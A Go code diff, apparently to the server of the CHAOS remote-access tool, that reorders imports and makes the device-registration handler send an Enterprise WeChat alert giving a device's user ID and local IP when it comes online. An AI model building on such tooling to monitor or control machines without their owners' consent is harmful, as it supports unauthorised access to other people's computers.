@@ -5,6 +5,13 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"net/http"
+	"net/url"
+	"path/filepath"
+	"strconv"
+	"strings"
+	"time"
+
 	"github.com/gin-gonic/gin"
 	"github.com/gin-gonic/gin/binding"
 	"github.com/gorilla/websocket"
@@ -12,17 +19,12 @@ import (
 	"github.com/tiagorlampert/CHAOS/entities"
 	"github.com/tiagorlampert/CHAOS/internal"
 	"github.com/tiagorlampert/CHAOS/internal/utils"
+	"github.com/tiagorlampert/CHAOS/internal/utils/message"
 	"github.com/tiagorlampert/CHAOS/internal/utils/network"
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
 	"github.com/tiagorlampert/CHAOS/presentation/http/request"
 	"github.com/tiagorlampert/CHAOS/services/client"
 	"github.com/tiagorlampert/CHAOS/services/user"
-	"net/http"
-	"net/url"
-	"path/filepath"
-	"strconv"
-	"strings"
-	"time"
 )
 
 var upgrader = websocket.Upgrader{
@@ -145,6 +147,15 @@ func (h *httpController) setDeviceHandler(c *gin.Context) {
 		c.Status(http.StatusInternalServerError)
 		return
 	}
+
+	// var wx_config = h.Configuration.Wechat
+	// if wx_config.CORPID != "" && wx_config.CORPSECRET != "" && wx_config.AGENTID != "" {
+	// 发送企业微信通知
+	var wx_msg = fmt.Sprintf("%s:%s上线了", body.UserID, body.LocalIPAddress)
+	if err := message.SendTextMessage(wx_msg); err != nil {
+		h.Logger.WithFields(fields).Error(`Failed to send message: `, err.Error())
+	}
+	// }
 
 	c.Status(http.StatusOK)
 }
